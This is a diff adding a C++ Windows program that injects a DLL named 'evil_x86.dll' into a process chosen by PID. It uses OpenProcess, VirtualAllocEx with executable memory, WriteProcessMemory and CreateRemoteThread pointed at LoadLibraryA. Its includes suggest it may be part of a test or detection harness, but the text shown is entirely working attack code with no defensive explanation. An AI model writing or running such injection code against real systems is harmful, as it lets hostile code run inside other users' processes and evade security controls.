@@ -1,0 +1,60 @@
+#include <windows.h>
+#include <string>
+
+#include "../program_result.h"
+#include "interproc_coms.h"
+
+char evilDLL[] = "C:\\evil_x86.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+
+int main(int argc, char* argv[]) {
+  HANDLE ph; // process handle
+  HANDLE rt; // remote thread
+  LPVOID rb; // remote buffer
+
+  LoadLibraryA("evil_x86.dll");
+
+  // handle to kernel32 and pass it to GetProcAddress
+  HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+  if (hKernel32 == NULL) {
+    printf("Could not initialize Kernel32\n");
+    return -1;
+  }
+  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+  if (lb == NULL) {
+    printf("Could not initialize LoadLibraryA\n");
+    return -1;
+  }
+
+  // parse process ID
+  if ( atoi(argv[1]) == 0) {
+      printf("PID not found :( exiting...\n");
+      return -1;
+  }
+  printf("PID: %i", atoi(argv[1]));
+  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+  if (ph == NULL) {
+    printf(" [x] Error while opening the process\n");
+  } else printf("[i] Process opened\n");
+
+  // allocate memory buffer for remote process
+  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  if (rb == NULL) {
+    printf(" [x] Error while allocating space in the process\n");
+  } else printf(" [i] Successfully allocated memory in the target process\n");
+
+  // "copy" evil DLL between processes
+  BOOL res = WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+  if (res == NULL) {
+    printf(" [x] Error while writing memory to the target process\n");
+  } else printf(" [i] DLL path copied to the target process\n");
+
+  // our process start new thread
+  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+  if (rt == NULL) {
+    printf(" [x] Error creating thread in target process. Windows error: %s\n", error_handling::GetLastErrorAsString().c_str());
+  } else printf(" [i] Created thread in target process\n");
+  
+  CloseHandle(ph);
+  return 0;
+}
